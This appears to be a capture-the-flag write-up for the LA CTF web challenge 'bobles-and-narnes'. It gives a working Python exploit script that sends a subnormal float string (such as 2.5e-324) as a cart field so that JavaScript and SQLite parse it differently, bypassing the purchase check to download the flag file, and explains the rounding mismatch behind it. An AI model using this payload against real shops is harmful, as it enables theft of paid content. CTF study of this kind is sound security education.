# web - bobles-and-narnes

```
import requests

import zipfile

import io

import random

import string



# URL of the challenge instance

BASE_URL = "https://bobles-and-narnes-mj7ky.instancer.lac.tf/"

FLAG_BOOK_ID = "2a16e349fb9045fa"



def get_random_string(length=8):

    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))



def try_exploit(payload_val, payload_desc):

    s = requests.Session()

    username = f"user_{get_random_string()}"

    password = "password123"

    

    print(f"\n[---] Testing {payload_desc} [---]")

    try:

        s.post(f"{BASE_URL}/register", json={"username": username, "password": password})

    except:

        pass



    # Payload: A subnormal number smaller than MIN_VALUE but large enough to round up in JS

    payload = {

        "products": [

            {

                "book_id": FLAG_BOOK_ID,

                "is_sample": payload_val

            }

        ]

    }

    

    print(f"[*] Sending payload to /cart/add...")

    r = s.post(f"{BASE_URL}/cart/add", json=payload)

    print(f"[*] Add response: {r.text}")

    

    if "too poor" in r.text:

        print("[-] Failed JS Cost Check (Value resolved to 0).")

        return False



    print("[*] Checking out...")

    r = s.post(f"{BASE_URL}/cart/checkout")

    

    if r.status_code == 200 and "application/zip" in r.headers.get("Content-Type", ""):

        try:

            with zipfile.ZipFile(io.BytesIO(r.content)) as z:

                print(f"[*] ZIP Content: {z.namelist()}")

                if "flag.txt" in z.namelist():

                    flag = z.read("flag.txt").decode().strip()

                    print(f"\n[!!!] SUCCESS! FLAG: {flag}\n")

                    return True

                else:

                    print("[-] Failed. Got sample file (DB stored Non-Zero).")

        except Exception as e:

            print(f"[-] ZIP Error: {e}")

    else:

        print(f"[-] Checkout failed: {r.status_code}")

    return False



# Try values between 0.5 * MIN_VALUE and MIN_VALUE

# MIN_VALUE is approx 4.94e-324. Half is ~2.47e-324.



# 1. "3e-324": Likely rounds to 5e-324 in JS. Hopefully 0 in SQLite.

if not try_exploit("3e-324", "String '3e-324'"):

    # 2. "2.5e-324": Very close to the halfway point.

    try_exploit("2.5e-324", "String '2.5e-324'")
```
Flag: `lactf{hojicha_chocolate_dubai_labubu}`

SOLVED by Ha1qal

Why 2.5e-324 Worked

This specific number sits in the "rounding gap" for Denormalized Floating Point Numbers (extremely small numbers close to zero).

JavaScript (V8): JavaScript follows the IEEE 754 standard strictly. The smallest representable positive number is 5e-324 (Number.MIN_VALUE). When you input 2.5e-324, it is exactly halfway between 0 and 5e-324. V8's rounding logic ("ties to even" or specific implementation details) rounded this UP to 5e-324.

Result: Truthy (Cost = $0).

SQLite: SQLite's internal text-to-float parser (or the bun:sqlite binding) handled this edge case differently. It likely determined that 2.5e-324 was too small to represent or rounded it DOWN (truncated/underflow) to 0.0.

Result: Falsy (Delivers Real File).

Solved by: yappare